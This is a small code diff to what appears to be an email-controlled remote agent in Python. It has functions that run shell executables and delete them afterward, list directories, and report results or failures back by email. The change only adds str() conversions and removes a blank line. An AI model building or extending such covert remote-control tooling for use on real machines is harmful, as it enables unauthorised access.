@@ -124,7 +124,7 @@ def showFiles(commandString):
             sendEmail(payload)
 
         except:
-            subjectLine = "Subject: Failed directory fetch from " + id
+            subjectLine = "Subject: Failed directory fetch from " + str(id)
             sendEmail(subjectLine)
 
 
@@ -157,7 +157,7 @@ def executeCom(commandString):
             os.remove(executable_file)
 
         except:
-            subjectLine = "Subject: Failed to run shell exe " + id
+            subjectLine = "Subject: Failed to run shell exe " + str(id)
             sendEmail(subjectLine)
 
 
@@ -217,7 +217,6 @@ def readEmail():
     if(isBroadcast):
         time.sleep(15)
         mail.store(i, '+FLAGS', '\\Deleted')
-
     mail.expunge()
     mail.close()
     mail.logout()
